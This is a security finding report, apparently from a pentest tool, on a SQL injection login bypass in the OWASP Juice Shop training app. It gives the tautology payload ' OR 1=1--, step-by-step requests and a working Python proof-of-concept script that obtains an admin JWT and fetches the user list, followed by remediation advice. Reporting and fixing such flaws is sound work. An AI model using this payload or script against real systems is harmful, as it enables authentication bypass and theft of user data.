│                                                                              │
│  Description                                                                 │
│  A SQL injection vulnerability was identified in the login endpoint that     │
│  accepts user-supplied credentials as JSON. The `email` field is             │
│  incorporated into the backend SQL query without safe parameterization,      │
│  enabling an attacker to modify the query logic.\n\nBy injecting a           │
│  tautology into the `email` field, an unauthenticated attacker can bypass    │
│  authentication and obtain a valid JWT for the administrative account        │
│  (`admin@juice-sh.op`). This JWT can then be used to access protected API    │
│  endpoints intended only for authenticated/authorized users.                 │
│                                                                              │
│  Impact                                                                      │
│  Successful exploitation allows unauthenticated attackers to:\n\n- Log in    │
│  as an administrative user without knowing any credentials\n- Obtain a       │
│  valid signed JWT representing an admin session\n- Access protected          │
│  administrative or sensitive API resources (demonstrated with `/api/Users`,  │
│  returning the full user list including roles)\n\nThis represents a          │
│  high-impact compromise of confidentiality and integrity and can lead to     │
│  full administrative takeover of the application.                            │
│                                                                              │
│  Technical Analysis                                                          │
│  The login endpoint at `POST /rest/user/login` accepts a JSON body           │
│  containing `email` and `password`. The observed behavior indicates the      │
│  `email` parameter is concatenated into a SQL query (SQLite backend),        │
│  allowing classic boolean-based SQL injection.\n\nEvidence of                │
│  exploitability:\n- A tautology payload in `email` (`' OR 1=1--`) returns    │
│  HTTP 200 and includes a JWT whose payload contains `role\":\"admin\"` and   │
│  `email\":\"admin@juice-sh.op\"`.\n- A false control payload (`' OR 1=2--`)  │
│  returns HTTP 401 (no login).\n\nImpact validation:\n- Without an            │
│  Authorization header, `GET /api/Users` returns 401.\n- With the JWT         │
│  obtained from the injected login request, `GET /api/Users` returns 200 and  │
│  the complete users dataset.\n\nEvidence references:\n- Successful injected  │
│  login: request_id 709\n- False control login: request_id 726\n- Protected   │
│  endpoint baseline (no auth): request_id 707\n- Protected endpoint with      │
│  injected-login JWT: request_id 714                                          │
│                                                                              │
│  PoC Description                                                             │
│  1. Send an authentication request with an injected `email` value:\n\n       │
│  POST http://juiceshop:3000/rest/user/login\n   Content-Type:                │
│  application/json\n   \n   {\"email\":\"' OR                                 │
│  1=1--\",\"password\":\"x\"}\n\n   Expected result: HTTP 200 and a JSON      │
│  response containing `authentication.token` (JWT) for                        │
│  `admin@juice-sh.op`.\n\n2. Send a control request to confirm the boolean    │
│  condition drives the outcome:\n\n   {\"email\":\"' OR                       │
│  1=2--\",\"password\":\"x\"}\n\n   Expected result: HTTP 401                 │
│  (authentication fails).\n\n3. Demonstrate post-auth impact using the        │
│  returned JWT:\n\n   GET http://juiceshop:3000/api/Users\n   Authorization:  │
│  Bearer <JWT_FROM_STEP_1>\n\n   Expected result: HTTP 200 with the full      │
│  users list (including admin users and roles). Without the Authorization     │
│  header, the endpoint returns HTTP 401.                                      │
│                                                                              │
│  PoC Code                                                                    │
│  import base64\nimport json\nimport sys\nfrom typing import Any,             │
│  Dict\n\nimport requests\n\nBASE = \"http://juiceshop:3000\"\nLOGIN_URL =    │
│  f\"{BASE}/rest/user/login\"\nUSERS_URL = f\"{BASE}/api/Users\"\n\n\ndef     │
│  b64url_decode(data: str) -> bytes:\n    data += \"=\" * (-len(data) % 4)\n  │
│  return base64.urlsafe_b64decode(data.encode())\n\n\ndef                     │
│  decode_jwt_no_verify(token: str) -> Dict[str, Any]:\n    parts =            │
│  token.split(\".\")\n    if len(parts) < 2:\n        return {}\n    payload  │
│  = json.loads(b64url_decode(parts[1]).decode(errors=\"replace\"))\n          │
│  return payload\n\n\ndef main() -> int:\n    s = requests.Session()\n        │
│  s.headers.update({\"Accept\": \"application/json\"})\n\n    print(\"[1]     │
│  Baseline: /api/Users without Authorization header\")\n    r0 =              │
│  s.get(USERS_URL, timeout=15)\n    print(\"Status:\", r0.status_code)\n      │
│  print(\"Body (first 200):\", r0.text[:200])\n    print()\n\n                │
│  print(\"[2] Control login (should fail)\")\n    control = {\"email\": \"'   │
│  OR 1=2--\", \"password\": \"x\"}\n    r1 = s.post(LOGIN_URL, json=control,  │
│  timeout=15)\n    print(\"Status:\", r1.status_code)\n    print(\"Body:\",   │
│  r1.text)\n    print()\n\n    print(\"[3] Injected login (should             │
│  succeed)\")\n    inj = {\"email\": \"' OR 1=1--\", \"password\": \"x\"}\n   │
│  r2 = s.post(LOGIN_URL, json=inj, timeout=15)\n    print(\"Status:\",        │
│  r2.status_code)\n    if r2.status_code != 200:\n        print(\"Unexpected  │
│  response:\", r2.text)\n        return 1\n\n    data = r2.json()\n    token  │
│  = data.get(\"authentication\", {}).get(\"token\")\n    if not token:\n      │
│  print(\"No token in response\")\n        print(r2.text)\n        return     │
│  1\n\n    claims = decode_jwt_no_verify(token)\n    user =                   │
│  (claims.get(\"data\") or {})\n    print(\"JWT claims summary:\")\n          │
│  print(\"  email:\", user.get(\"email\"))\n    print(\"  role:\",            │
│  user.get(\"role\"))\n    print(\"  id:\", user.get(\"id\"))\n               │
│  print()\n\n    print(\"[4] Use injected-login JWT to access                 │
│  /api/Users\")\n    r3 = s.get(USERS_URL, headers={\"Authorization\":        │
│  f\"Bearer {token}\"}, timeout=15)\n    print(\"Status:\",                   │
│  r3.status_code)\n    print(\"Body (first 500):\", r3.text[:500])\n\n        │
│  return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())    │
│                                                                              │
│  Remediation                                                                 │
│  Implement layered defenses:\n\n- Use parameterized queries / safe ORM       │
│  bindings for all user-supplied values (including `email` and `password`)    │
│  and avoid raw SQL string construction.\n- Ensure authentication logic uses  │
│  constant-time comparisons and does not incorporate unsanitized input into   │
│  dynamic SQL fragments.\n- Remove detailed database error information from   │
│  client responses (return generic errors; log server-side only).\n- Add      │
│  automated security tests for authentication endpoints (negative tests for   │
│  injection payloads).\n- Consider adding application-layer protections such  │
│  as input validation for email format and WAF rules for common SQLi          │
│  patterns as defense-in-depth (not as a primary control).                    │
